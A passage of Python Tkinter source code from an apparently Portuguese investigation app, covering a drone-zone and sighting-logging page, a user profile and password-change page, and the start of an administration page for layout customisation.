        zona_menu["menu"].configure(bg=PANEL_BG, fg=TEXT)
        zona_menu.pack(side="left", padx=5)

        tk.Label(self, text="🛸 DRONES - ANAC + EASA + DroneRadar + UTM + ADS-B DRONE DETECTION", bg="#0a1420", fg="#00e5ff", font=(FONT_MONO, 7, "bold"), wraplength=1100, justify="left").pack(fill="x", pady=(0, 8), ipady=4)

        body = tk.Frame(self, bg=BG)
        body.pack(fill="both", expand=True)

        left = tk.Frame(body, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM, width=420)
        left.pack(side="left", fill="y", padx=(0, 10))
        left.pack_propagate(False)

        # Zonas PT
        tk.Label(left, text="ZONAS DRONE PORTUGAL - ANAC", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 8, "bold")).pack(pady=(6,2))
        self.zonas_list = tk.Listbox(left, font=(FONT_MONO, 8), bg=BG, fg=TEXT, selectbackground=ACCENT_DIM, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, height=7)
        self.zonas_list.pack(fill="x", padx=6, pady=2)
        zonas = [
            "CTR Lisboa - PROIBIDO sem autorização ANAC",
            "CTR Porto - PROIBIDO sem autorização",
            "CTR Faro - Restrito",
            "Parque Natural Sintra - PROIBIDO",
            "Zona Militar Alfeite - PROIBIDO",
            "Aeroporto Lisboa 5km - PROIBIDO <120m",
            "Centro Lisboa - Autorização especial",
            "Costa Vicentina - Parque Natural - Restrito",
        ]
        for z in zonas:
            self.zonas_list.insert("end", z)
        self.zonas_list.bind("<<ListboxSelect>>", lambda e: self.on_zona_select())

        # Drones registados / modelos
        tk.Label(left, text="MODELOS / AVISTAMENTOS", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 8, "bold")).pack(pady=(8,2))
        self.listbox = tk.Listbox(left, font=(FONT_MONO, 8), bg=BG, fg=TEXT, selectbackground=ACCENT_DIM, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.listbox.pack(fill="both", expand=True, padx=6, pady=2)
        drones_ex = [
            "DJI Mavic 3 - 900g - Cinza - Avistado Alvalade 10:30",
            "DJI Mini 4 Pro - 249g - Branco - Parque Nações",
            "DJI Air 3 - 720g - Cinza - Suspeito 22:00",
            "Autel EVO II - 1.1kg - Laranja - Zona Militar",
            "FPV Racing - 500g - Preto - Alta velocidade",
            "Matrice 300 - 6.3kg - Industrial - Sines",
            "Parrot Anafi - 320g - Preto - Marinha",
            "Drone não identificado - Noite - Luzes vermelhas",
        ]
        for d in drones_ex:
            self.listbox.insert("end", d)
        self.listbox.bind("<<ListboxSelect>>", lambda e: self.on_drone_select())

        # Controles
        btns = tk.Frame(left, bg=PANEL_BG)
        btns.pack(fill="x", padx=6, pady=6)
        for txt, cmd in [("🔄 SCAN ADS-B DRONE", self.scan_drones), ("📡 DroneRadar", self.open_droneradar)]:
            b = tk.Button(btns, text=txt, command=cmd, bg=BTN_BG, fg=TEXT, font=(FONT_MONO, 7, "bold"), relief="flat", bd=0, padx=6, pady=4, cursor="hand2")
            b.pack(side="left", padx=2, fill="x", expand=True)

        right = tk.Frame(body, bg=BG)
        right.pack(side="left", fill="both", expand=True)

        detail = tk.Frame(right, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM)
        detail.pack(fill="x", pady=(0,10))
        tk.Label(detail, text="DETALHES DRONE / ZONA", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(anchor="w", padx=10, pady=8)
        self.detail_text = scrolledtext.ScrolledText(detail, font=(FONT_MONO, 8), bg=BG, fg=TEXT, height=10, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.detail_text.pack(fill="x", padx=8, pady=(0,8))
        self.detail_text.insert("1.0", "Seleciona zona ou drone...\n\nDados drone: Modelo, Peso, Operador, Registo ANAC, Altura, Autonomia, Câmara, Frequência, RID (Remote ID), etc.\n\nZonas: CTR, ATZ, Parques Naturais, Militares, Aglomerações urbanas - tudo regulado ANAC/EASA.\n\nDeteção: ADS-B para drones grandes, RF detection, RID, visual.")

        # Sistemas drone
        actions = tk.Frame(right, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM)
        actions.pack(fill="both", expand=True)
        tk.Label(actions, text="SISTEMAS DRONE - RADAR & REGULAÇÃO", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(anchor="w", padx=10, pady=8)

        btns_grid = tk.Frame(actions, bg=PANEL_BG)
        btns_grid.pack(fill="x", padx=8, pady=4)

        drone_buttons = [
            ("🟦 ANAC Drones PT", "https://www.anac.pt/vPT/Generico/drones/"),
            ("🟩 EASA Drones", "https://www.easa.europa.eu/en/domains/civil-drones-rpas"),
            ("🟨 DroneRadar (PT oficial)", "https://droneradar.anac.pt/"),
            ("⬛ Dronetag / RID", "https://dronetag.com/"),
            ("🟪 NOTAM Drone PT", "https://www.nav.pt/ais/notam"),
            ("🟦 AIP Portugal", "https://www.nav.pt/ais/aip"),
            ("🟩 DJI FlySafe Map", "https://www.dji.com/flysafe/geo-map"),
            ("🟥 ADS-B Drone Filter", "https://globe.adsbexchange.com/?filter=drone"),
        ]

        for i, (txt, url) in enumerate(drone_buttons):
            if i % 2 == 0:
                r = tk.Frame(btns_grid, bg=PANEL_BG)
                r.pack(fill="x", pady=2)
            b = tk.Button(r, text=txt, command=lambda u=url: webbrowser.open(u), anchor="w", padx=8)
            b.pack(side="left", fill="x", expand=True, padx=2, ipady=5)
            style_button(b)
            b.configure(font=(FONT_MONO, 7, "bold"))

        # Busca manual
        manual = tk.Frame(actions, bg=PANEL_BG)
        manual.pack(fill="x", padx=10, pady=10)
        tk.Label(manual, text="BUSCA OPERADOR / REGISTO / RID:", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 7, "bold")).pack(anchor="w")
        manual_row = tk.Frame(manual, bg=PANEL_BG)
        manual_row.pack(fill="x", pady=4)
        self.manual_entry = tk.Entry(manual_row, font=(FONT_MONO, 10), bg=BG, fg=TEXT, insertbackground=ACCENT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.manual_entry.pack(side="left", fill="x", expand=True, ipady=4, padx=(0,6))
        self.manual_entry.insert(0, "DJI Mavic 3 - PT-DRN123")
        for txt, base in [("ANAC", "https://www.anac.pt/vPT/Generico/drones/Paginas/"), ("Google", "https://www.google.com/search?q=drone+operador+portugal+")] :
            b = tk.Button(manual_row, text=txt, command=lambda ba=base: self.search_manual(ba), bg=BTN_BG, fg=ACCENT, font=(FONT_MONO, 7, "bold"), relief="flat", bd=0, padx=8, pady=4, cursor="hand2")
            b.pack(side="left", padx=2)

        # Guardar
        save_frame = tk.Frame(right, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM)
        save_frame.pack(fill="x", pady=(10,0))
        tk.Label(save_frame, text="GUARDAR AVISTAMENTO DRONE:", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 8, "bold")).pack(anchor="w", padx=10, pady=(8,2))
        save_row = tk.Frame(save_frame, bg=PANEL_BG)
        save_row.pack(fill="x", padx=10, pady=6)
        self.obs_entry = tk.Entry(save_row, font=(FONT_MONO, 9), bg=BG, fg=TEXT, insertbackground=ACCENT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.obs_entry.pack(side="left", fill="x", expand=True, ipady=4)
        self.obs_entry.insert(0, "Avistamento drone - ex: FPV preto 22:30 Alvalade, suspeito, sem RID")
        btn_save = tk.Button(save_row, text="GUARDAR EM REGISTOS", command=self.guardar_resultado, bg=ACCENT_DIM, fg=ACCENT, font=(FONT_MONO, 7, "bold"), relief="flat", bd=0, padx=10, pady=5, cursor="hand2")
        btn_save.pack(side="left", padx=6)

        self.refresh_casos()

    def refresh_casos(self):
        casos = load_json(CASOS_FILE)
        menu = self.caso_menu["menu"]
        menu.delete(0, "end")
        titles = [c.get("titulo", "Sem titulo") for c in casos] if casos else ["Sem caso"]
        for t in titles:
            menu.add_command(label=t, command=lambda v=t: self.caso_var.set(v))
        if titles:
            self.caso_var.set(titles[0])

    def on_zona_select(self):
        sel = self.zonas_list.curselection()
        if not sel:
            return
        zona = self.zonas_list.get(sel[0])
        self.detail_text.delete("1.0", "end")
        self.detail_text.insert("1.0", f"""🛸 ZONA DRONE: {zona}

REGULAÇÃO ANAC/EASA:
- Categoria: {('OPEN' if 'Restrito' in zona else 'SPECIFIC' if 'Autorização' in zona else 'PROIBIDA')}
- Altura máx: 120m AGL (OPEN), até 500m com autorização
- Distância horizontal: VLOS (até 500m do piloto)
- Registo operador obrigatório se drone >250g ou com câmara
- Seguro obrigatório para >900g ou uso profissional

INVESTIGAÇÃO DRONE:
- Verificar se zona é CTR/ATZ - precisa autorização NAV + ANAC
- Se voo noturno - precisa luzes e autorização específica
- Se sobre aglomeração - categoria SPECIFIC, risco elevado
- Verificar DroneRadar ANAC para autorizações ativas na zona
- Verificar NOTAMs drone
- Identificar operador via RID (Remote ID) se drone transmite

Links: ANAC Drones, DroneRadar, EASA
""")

    def on_drone_select(self):
        sel = self.listbox.curselection()
        if not sel:
            return
        drone = self.listbox.get(sel[0])
        self.selected_drone = drone
        self.detail_text.delete("1.0", "end")
        self.detail_text.insert("1.0", f"""🛸 DRONE: {drone}

ANÁLISE TÉCNICA:
- Modelo: {drone.split('-')[0].strip()}
- Peso: {drone.split('-')[1].strip() if len(drone.split('-'))>1 else '—'}
- Cor: {drone.split('-')[2].strip() if len(drone.split('-'))>2 else '—'}
- Local avistado: {drone.split('-')[3].strip() if len(drone.split('-'))>3 else '—'}

OSINT DRONE:
- Frequência: 2.4GHz / 5.8GHz / 4G (verificar DJI OcuSync)
- RID: Verificar se transmite Remote ID (obrigatório EASA 2024+)
- Câmara: 4K? Zoom? Térmica?
- Autonomia: 20-45min típico
- Operador: Verificar registo ANAC se >250g

INVESTIGAÇÃO:
- Drone <250g sem câmara = categoria C0, pode voar sobre pessoas mas não aglomerações
- Drone com câmara = registo operador obrigatório
- Voo suspeito noturno / zona proibida = possível infração ANAC + crime
- Guardar: foto, vídeo, hora, direção, altura estimada, RID se captado

Técnicas deteção: RF scanner 2.4/5.8GHz, visual, acústico, radar, ADS-B para drones grandes
""")

    def scan_drones(self):
        # Simular scan ADS-B para drones - na prática usa filter drone no ADSBExchange
        self.detail_text.delete("1.0", "end")
        self.detail_text.insert("1.0", """📡 SCAN ADS-B DRONE - A INICIAR...

A procurar drones com transponder ADS-B / Remote ID...

Para deteção real:
1. Abre https://globe.adsbexchange.com/?filter=drone
2. Ou usa DroneScanner / Dronetag
3. Ou scanner RF 2.4GHz / 5.8GHz
4. Verifica DroneRadar ANAC para voos autorizados

Nota: Maioria dos drones pequenos NÃO transmite ADS-B, apenas RID (Remote ID) via WiFi/Bluetooth.
Para captar RID precisas de recetor dedicado (ex: Dronetag Mini, drone scanner).

Scan simulado: 0 drones ADS-B encontrados (normal para drones <25kg)
""")
        webbrowser.open("https://globe.adsbexchange.com/?filter=drone")

    def open_droneradar(self):
        webbrowser.open("https://droneradar.anac.pt/")

    def search_manual(self, base_url):
        q = self.manual_entry.get().strip()
        if not q:
            return
        webbrowser.open(base_url + urllib.parse.quote(q))

    def guardar_resultado(self):
        caso = self.caso_var.get()
        if not caso or caso == "Sem caso":
            messagebox.showwarning("Aviso", "Seleciona um caso ativo primeiro.")
            return
        obs = self.obs_entry.get().strip()
        desc = f"{obs} | Zona={self.zona_var.get()} Drone={self.selected_drone or self.manual_entry.get().strip()} | Fonte: ANAC/DroneRadar/RID"
        registo = {
            "id": str(uuid.uuid4())[:8],
            "caso": caso,
            "data": datetime.datetime.now().strftime("%Y-%m-%d %H:%M"),
            "fonte": "DRONES - ANAC/EASA/RID",
            "descricao": desc,
        }
        buscas = load_json(BUSCAS_FILE)
        buscas.append(registo)
        save_json(BUSCAS_FILE, buscas)
        messagebox.showinfo("Guardado", f"Avistamento drone guardado em REGISTOS do caso {caso}")
        self.obs_entry.delete(0, "end")




# ─────────────────────────────────────────────
# Página Investigação
# ─────────────────────────────────────────────

# ─────────────────────────────────────────────
# Página Usuário - Simplificada (Perfil + Segurança apenas)
# ─────────────────────────────────────────────
class UsuarioPage(Page):
    def __init__(self, parent, app):
        super().__init__(parent, app)
        self.app_ref = app
        self.username = app.username
        self.header("USUÁRIO", f"perfil e segurança — {self.username}")
        self._clock_running = True
        top_bar = tk.Frame(self, bg=BG)
        top_bar.pack(fill="x", padx=34, pady=(0, 8))
        self.clock_label = tk.Label(top_bar, bg=BG, fg=ACCENT, font=(FONT_MONO, 10, "bold"))
        self.clock_label.pack(side="left")
        self.update_clock()
        tk.Label(top_bar, text=f"● {self.username} | SESSÃO ATIVA", bg=BG, fg="#00ff88", font=(FONT_MONO, 8, "bold")).pack(side="right")
        body = tk.Frame(self, bg=BG)
        body.pack(fill="both", expand=True, padx=24, pady=(0, 16))
        left = tk.Frame(body, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM, width=280)
        left.pack(side="left", fill="y", padx=(0, 16))
        left.pack_propagate(False)
        tk.Label(left, text="FOTO DE PERFIL", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(pady=(16, 8))
        self.photo_frame = tk.Frame(left, bg="#0d1520", width=200, height=200)
        self.photo_frame.pack(pady=6, padx=20)
        self.photo_frame.pack_propagate(False)
        self.photo_frame_inner = tk.Frame(self.photo_frame, bg="#0d1520")
        self.photo_frame_inner.pack(fill="both", expand=True)
        self.photo_label = tk.Label(self.photo_frame_inner, bg="#0d1520", fg=TEXT_DIM, text="SEM FOTO\n\n  ◉  ", font=(FONT_MONO, 12), wraplength=180, justify="center")
        self.photo_label.pack(fill="both", expand=True)
        self.tk_photo = None
        btns_photo = tk.Frame(left, bg=PANEL_BG)
        btns_photo.pack(fill="x", padx=16, pady=10)
        btn_foto = tk.Button(btns_photo, text="📁  ALTERAR FOTO", command=self.alterar_foto)
        btn_foto.pack(fill="x", pady=3, ipady=6)
        style_button(btn_foto)
        btn_rem_foto = tk.Button(btns_photo, text="🗑  REMOVER FOTO", command=self.remover_foto)
        btn_rem_foto.pack(fill="x", pady=3, ipady=4)
        btn_rem_foto.configure(bg="#1a0a0f", fg=ERROR, activebackground="#2a0f17", activeforeground=ERROR, relief="flat", bd=0, font=(FONT_MONO, 8, "bold"), cursor="hand2", highlightthickness=1, highlightbackground="#3a1620")
        tk.Frame(left, bg=ACCENT_DIM, height=1).pack(fill="x", padx=16, pady=10)
        tk.Label(left, text="RESUMO RÁPIDO", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 8, "bold")).pack(anchor="w", padx=16, pady=(0, 6))
        self.quick_stats_frame = tk.Frame(left, bg=PANEL_BG)
        self.quick_stats_frame.pack(fill="x", padx=16, pady=(0, 10))
        right = tk.Frame(body, bg=BG)
        right.pack(side="left", fill="both", expand=True)
        style = ttk.Style()
        style.theme_use("default")
        style.configure("TNotebook", background=BG, borderwidth=0)
        style.configure("TNotebook.Tab", background=BTN_BG, foreground=TEXT_DIM, padding=[10, 6], font=(FONT_MONO, 8, "bold"), borderwidth=0)
        style.map("TNotebook.Tab", background=[("selected", ACCENT_DIM)], foreground=[("selected", ACCENT)])
        self.nb = ttk.Notebook(right)
        self.nb.pack(fill="both", expand=True)
        self.tab_perfil = tk.Frame(self.nb, bg=BG)
        self.nb.add(self.tab_perfil, text="  👤 PERFIL  ")
        self.build_perfil_tab()
        self.tab_seg = tk.Frame(self.nb, bg=BG)
        self.nb.add(self.tab_seg, text="  🔐 SEGURANÇA  ")
        self.build_seguranca_tab()
        self.refresh_all()

    def build_perfil_tab(self):
        self.info_frame = tk.Frame(self.tab_perfil, bg=BG)
        self.info_frame.pack(fill="x", padx=16, pady=12)

    def refresh_perfil_info(self):
        for w in self.info_frame.winfo_children():
            w.destroy()
        users = load_users()
        data = users.get(self.username, {})
        if isinstance(data, str):
            data = {"password": data, "created_at": "Desconhecido", "last_login": "Desconhecido", "password_changed": "Nunca", "photo": "", "role": "admin" if self.username.lower()=="aires" else "user"}
        if "role" not in data:
            data["role"] = "admin" if self.username.lower()=="aires" else "user"
            users[self.username] = data
            save_users(users)
        def get_ip():
            try:
                s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8",80))
                ip=s.getsockname()[0]
                s.close()
                return ip
            except:
                return "127.0.0.1"
        infos = [
            ("UTILIZADOR", self.username),
            ("FUNÇÃO", data.get("role","user").upper()),
            ("CONTA CRIADA EM", data.get("created_at", "—")),
            ("ÚLTIMO LOGIN", data.get("last_login", "—")),
            ("ÚLTIMA ALTERAÇÃO DE SENHA", data.get("password_changed", "Nunca")),
            ("DATA/HORA ATUAL", datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")),
            ("IP LOCAL", get_ip()),
            ("SISTEMA", f"{platform.system()} {platform.release()}"),
            ("FOTO", "Definida" if data.get("photo") and os.path.exists(data.get("photo","")) else "Sem foto"),
        ]
        for label, value in infos:
            row = tk.Frame(self.info_frame, bg=PANEL_BG)
            row.pack(fill="x", pady=3)
            tk.Label(row, text=label, bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 7, "bold"), width=28, anchor="w").pack(side="left", padx=8, pady=6)
            tk.Label(row, text=value, bg=PANEL_BG, fg=TEXT, font=(FONT_MONO, 9, "bold"), anchor="w").pack(side="left", padx=8, pady=6)
        self.photo_path = data.get("photo", "")
        if self.photo_path and os.path.exists(self.photo_path):
            self.load_photo_image(self.photo_path)
        else:
            self.photo_label.configure(text="SEM FOTO\n\n  ◉  ", image="")
            self.tk_photo = None
        for w in self.quick_stats_frame.winfo_children():
            w.destroy()
        casos = load_json(CASOS_FILE, [])
        clientes = load_json(CLIENTES_FILE, [])
        buscas = load_json(BUSCAS_FILE, [])
        stats = [("Casos", len(casos)), ("Clientes", len(clientes)), ("Registos", len(buscas)), ("Utilizadores", len(users))]
        for label, val in stats:
            row = tk.Frame(self.quick_stats_frame, bg=BG)
            row.pack(fill="x", pady=2)
            tk.Label(row, text=label+":", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 7), width=12, anchor="w").pack(side="left", padx=4)
            tk.Label(row, text=str(val), bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 8, "bold"), anchor="w").pack(side="left", padx=4)

    def build_seguranca_tab(self):
        tk.Label(self.tab_seg, text="ALTERAR PALAVRA-PASSE", bg=BG, fg=ACCENT, font=(FONT_MONO, 11, "bold")).pack(anchor="w", padx=16, pady=(16, 8))
        tk.Frame(self.tab_seg, bg=ACCENT_DIM, height=1).pack(fill="x", padx=16, pady=(0, 12))
        form = tk.Frame(self.tab_seg, bg=BG)
        form.pack(fill="x", padx=16)
        self.old_pass = self._make_pass_entry(form, "SENHA ATUAL")
        self.new_pass = self._make_pass_entry(form, "NOVA SENHA")
        self.new_pass.bind("<KeyRelease>", lambda e: self.check_strength())
        self.strength_label = tk.Label(form, text="Força: -", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8, "bold"))
        self.strength_label.pack(anchor="w", pady=(0, 8))
        self.confirm_pass = self._make_pass_entry(form, "CONFIRMAR NOVA SENHA")
        btn_save_pass = tk.Button(form, text="🔐  ATUALIZAR SENHA", command=self.atualizar_senha)
        btn_save_pass.pack(fill="x", pady=12, ipady=10)
        style_button(btn_save_pass)

    def _make_pass_entry(self, parent, label):
        tk.Label(parent, text=label, bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(anchor="w")
        entry = tk.Entry(parent, show="●", font=(FONT_MONO, 11), bg=PANEL_BG, fg=TEXT, insertbackground=ACCENT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        entry.pack(fill="x", pady=(2, 10), ipady=6)
        return entry

    def check_strength(self):
        pwd = self.new_pass.get()
        if not pwd:
            self.strength_label.configure(text="Força: -", fg=TEXT_DIM)
            return
        score=0
        if len(pwd)>=8: score+=1
        if len(pwd)>=12: score+=1
        if any(c.islower() for c in pwd): score+=1
        if any(c.isupper() for c in pwd): score+=1
        if any(c.isdigit() for c in pwd): score+=1
        if any(c in "!@#$%^&*()-_=+[]{}|;:,.<>?/" for c in pwd): score+=1
        if score<=2:
            self.strength_label.configure(text=f"Força: FRACA ({score}/6)", fg=ERROR)
        elif score<=4:
            self.strength_label.configure(text=f"Força: MÉDIA ({score}/6)", fg="#ffb700")
        else:
            self.strength_label.configure(text=f"Força: FORTE ({score}/6)", fg="#00ff88")

    def update_clock(self):
        if not self._clock_running or not self.winfo_exists():
            return
        now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        try:
            self.clock_label.configure(text=f"{now}  |  SESSÃO: {self.username}")
        except Exception:
            return
        self.after(1000, self.update_clock)

    def load_photo_image(self, photo_path):
        try:
            PIL = ensure_package("pillow", "PIL")
            if not PIL:
                raise Exception("Pillow não disponível")
            from PIL import Image, ImageTk
            img = Image.open(photo_path)
            img = img.convert("RGB")
            img.thumbnail((200, 200), Image.LANCZOS)
            bg = Image.new("RGB", (200, 200), "#0d1520")
            offset = ((200 - img.width)//2, (200 - img.height)//2)
            bg.paste(img, offset)
            self.tk_photo = ImageTk.PhotoImage(bg)
            self.photo_label.configure(image=self.tk_photo, text="")
            self.photo_label.image = self.tk_photo
        except Exception:
            self.photo_label.configure(text=f"ERRO", image="", font=(FONT_MONO, 8))
            self.tk_photo = None

    def refresh_all(self):
        self.refresh_perfil_info()
        self.cfg = load_ui_config()

    def refresh_info(self):
        self.refresh_all()

    def alterar_foto(self):
        file = filedialog.askopenfilename(title="Escolher foto", filetypes=[("Imagens JPG/PNG", "*.png *.jpg *.jpeg *.webp"), ("Todos", "*.*")])
        if not file:
            return
        try:
            os.makedirs(PROFILE_DIR, exist_ok=True)
            ext = os.path.splitext(file)[1].lower()
            if ext not in [".jpg", ".jpeg", ".png", ".webp"]:
                ext = ".png"
            dest = os.path.join(PROFILE_DIR, f"{self.username}{ext}")
            shutil.copyfile(file, dest)
            users = load_users()
            if self.username in users and isinstance(users[self.username], dict):
                users[self.username]["photo"] = dest
                save_users(users)
            self.refresh_all()
            messagebox.showinfo("Foto", "Foto atualizada!")
        except Exception as e:
            messagebox.showerror("Erro", f"Erro foto: {e}")

    def remover_foto(self):
        users = load_users()
        if self.username in users and isinstance(users[self.username], dict):
            photo = users[self.username].get("photo","")
            if photo and os.path.exists(photo):
                try:
                    os.remove(photo)
                except Exception:
                    pass
            users[self.username]["photo"] = ""
            save_users(users)
        self.refresh_all()

    def atualizar_senha(self):
        old = self.old_pass.get()
        new = self.new_pass.get()
        confirm = self.confirm_pass.get()
        if not old or not new or not confirm:
            messagebox.showwarning("Aviso", "Preenche todos os campos.")
            return
        if new != confirm:
            messagebox.showerror("Erro", "Senhas não coincidem.")
            return
        users = load_users()
        data = users.get(self.username)
        stored = data["password"] if isinstance(data, dict) else data
        if not verify_password(stored, old):
            messagebox.showerror("Erro", "Senha atual incorreta.")
            return
        users[self.username]["password"] = hash_password(new)
        users[self.username]["password_changed"] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        save_users(users)
        self.old_pass.delete(0, "end")
        self.new_pass.delete(0, "end")
        self.confirm_pass.delete(0, "end")
        self.strength_label.configure(text="Força: -", fg=TEXT_DIM)
        self.refresh_all()
        messagebox.showinfo("Sucesso", "Senha alterada!")

    def on_show(self):
        self.refresh_all()


# ─────────────────────────────────────────────
# Página Administração - NOVA CATEGORIA acima de SAIR
# ─────────────────────────────────────────────
class AdministracaoPage(Page):
    SIDEBAR_NAMES = {
        "UsuarioPage": "👤  Usuário",
        "RedeAiresPage": "✦  Rede Aires",
        "InvestigacaoPage": "🔎  Investigação",
        "IAPage": "🤖  IA",
        "IPTVPage": "📺  IPTV",
        "RadioPage": "📻  Radio",
        "MusicPage": "🎵  Music",
        "CheatsPage": "🎮  Cheats",
        "SpooferPage": "🎭  Sp00fer",
        "MilitarPage": "🪖  Militar",
        "NavegadoresPage": "🌐  Navegadores",
        "FerramentasPage": "🧰  Ferramentas",
        "": "ℹ  Sobre",
        "AdministracaoPage": "🛡  Administração",
    }
    INVEST_NAMES = {
        "dash": "📊 INFORMAÇÕES",
        "buscas": "📝 REGISTOS",
        "casos": "📁 CASOS",
        "clientes": "👥 CLIENTES",
        "osint": "🔎 OSINT",
        "veiculos": "🚗 VEÍCULOS",
        "camaras": "📹 CÂMARAS",
        "avioes": "✈ AVIÕES",
        "barcos": "🚢 BARCOS",
        "drones": "🛸 DRONES",
    }

    def __init__(self, parent, app):
        super().__init__(parent, app)
        self.app_ref = app
        self.username = app.username
        self.header("ADMINISTRAÇÃO", "gestão completa do sistema — personalização, utilizadores, categorias, aplicação e aparência")
        self.cfg = load_ui_config()

        # Style notebook
        style = ttk.Style()
        style.theme_use("default")
        style.configure("TNotebook", background=BG, borderwidth=0)
        style.configure("TNotebook.Tab", background=BTN_BG, foreground=TEXT_DIM, padding=[10, 6], font=(FONT_MONO, 8, "bold"), borderwidth=0)
        style.map("TNotebook.Tab", background=[("selected", ACCENT_DIM)], foreground=[("selected", ACCENT)])

        nb = ttk.Notebook(self)
        nb.pack(fill="both", expand=True, padx=14, pady=(0,12))

        self.tab_pers = tk.Frame(nb, bg=BG)
        self.tab_users = tk.Frame(nb, bg=BG)
        self.tab_app = tk.Frame(nb, bg=BG)
        self.tab_cats = tk.Frame(nb, bg=BG)
        self.tab_appear = tk.Frame(nb, bg=BG)

        nb.add(self.tab_pers, text="  🎨 PERSONALIZAÇÃO  ")
        nb.add(self.tab_users, text="  👥 UTILIZADORES  ")
        nb.add(self.tab_app, text="  ⚙ APLICAÇÃO  ")
        nb.add(self.tab_cats, text="  📁 CATEGORIAS  ")
        nb.add(self.tab_appear, text="  🌗 APARÊNCIA  ")

        self.build_personalizacao_tab()
        self.build_users_tab()
        self.build_app_tab()
        self.build_categorias_tab()
        self.build_aparencia_tab()
        self.refresh_all()

    # ─── PERSONALIZAÇÃO (movida de UsuarioPage) ───
    def build_personalizacao_tab(self):
        tk.Label(self.tab_pers, text="PERSONALIZAÇÃO DE LAYOUT - ▲▼", bg=BG, fg=ACCENT, font=(FONT_MONO, 11, "bold")).pack(anchor="w", padx=16, pady=(16, 4))
        tk.Label(self.tab_pers, text="Gerido em ui_config.json — agora em Administração", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8), wraplength=800, justify="left").pack(anchor="w", padx=16, pady=(0, 12))
        body = tk.Frame(self.tab_pers, bg=BG)
        body.pack(fill="both", expand=True, padx=16, pady=6)
        left = tk.Frame(body, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM)
        left.pack(side="left", fill="both", expand=True, padx=(0, 8))
        tk.Label(left, text="MENU LATERAL", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(pady=8)
        self.list_sidebar = tk.Listbox(left, font=(FONT_MONO, 9), bg=BG, fg=TEXT, selectbackground=ACCENT_DIM, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, height=12)
        self.list_sidebar.pack(fill="both", expand=True, padx=8, pady=4)
        btns_side = tk.Frame(left, bg=PANEL_BG)
        btns_side.pack(fill="x", padx=8, pady=6)
        for txt, cmd in [("▲ SUBIR", lambda: self.move_up(self.list_sidebar, self.cfg["sidebar_order"])), ("▼ DESCER", lambda: self.move_down(self.list_sidebar, self.cfg["sidebar_order"])), ("👁 OCULTAR", self.hide_selected_sidebar), ("🔄 RESET", self.reset_sidebar)]:
            b = tk.Button(btns_side, text=txt, command=cmd)
            b.pack(side="left", fill="x", expand=True, padx=2, ipady=5)
            style_button(b)
            b.configure(font=(FONT_MONO, 7, "bold"))
        right = tk.Frame(body, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM)
        right.pack(side="left", fill="both", expand=True, padx=(8, 0))
        tk.Label(right, text="INVESTIGAÇÃO TABS", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(pady=8)
        self.list_invest = tk.Listbox(right, font=(FONT_MONO, 9), bg=BG, fg=TEXT, selectbackground=ACCENT_DIM, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, height=12)
        self.list_invest.pack(fill="both", expand=True, padx=8, pady=4)
        btns_inv = tk.Frame(right, bg=PANEL_BG)
        btns_inv.pack(fill="x", padx=8, pady=6)
        for txt, cmd in [("▲ SUBIR", lambda: self.move_up(self.list_invest, self.cfg["investigacao_order"])), ("▼ DESCER", lambda: self.move_down(self.list_invest, self.cfg["investigacao_order"])), ("🔄 RESET", self.reset_invest)]:
            b = tk.Button(btns_inv, text=txt, command=cmd)
            b.pack(side="left", fill="x", expand=True, padx=2, ipady=5)
            style_button(b)
            b.configure(font=(FONT_MONO, 7, "bold"))
        # Hidden list
        hidden_frame = tk.Frame(self.tab_pers, bg=BG)
        hidden_frame.pack(fill="x", padx=16, pady=6)
        tk.Label(hidden_frame, text="OCULTOS:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 7, "bold")).pack(side="left")
        self.hidden_label = tk.Label(hidden_frame, text="—", bg=BG, fg=ACCENT, font=(FONT_MONO, 7))
        self.hidden_label.pack(side="left", padx=8)
        b_show_all = tk.Button(hidden_frame, text="👁 MOSTRAR TODOS", command=self.show_all_hidden, bg=BTN_BG, fg=TEXT, font=(FONT_MONO, 7, "bold"), relief="flat", bd=0, padx=8, pady=2, cursor="hand2")
        b_show_all.pack(side="right")

        bottom = tk.Frame(self.tab_pers, bg=BG)
        bottom.pack(fill="x", padx=16, pady=10)
        b_save = tk.Button(bottom, text="💾 GUARDAR E APLICAR PERSONALIZAÇÃO", command=self.save_and_apply_personalizacao)
        b_save.pack(fill="x", ipady=10)
        style_button(b_save)
